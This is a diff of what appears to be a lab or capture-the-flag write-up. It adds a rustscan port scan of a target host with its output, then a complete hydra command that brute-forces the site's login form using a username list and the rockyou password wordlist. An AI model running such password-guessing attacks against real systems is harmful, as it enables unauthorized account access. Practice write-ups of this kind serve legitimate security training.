@@ -41,5 +41,20 @@ emma.taylor
 david.brown
 james.wright
 
-I run a rustscan command to scope out the website as well as additional hidden files
-rustscan -a 10.129.85.22
+I run a rustscan command to scope out the open ports 
+rustscan -a 10.129.153.54
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+
+Now that I have a list of usernames I am going to brute force the webspage using hydra and a wordlist saved to the attack box 
+
+Hydra: 
+hydra \
+-L users.txt \
+-P /usr/share/wordlists/rockyou.txt \
+10.129.153.54 \
+http-post-form \
+"/index.php:username=^USER^&password=^PASS^:F=Invalid"
+
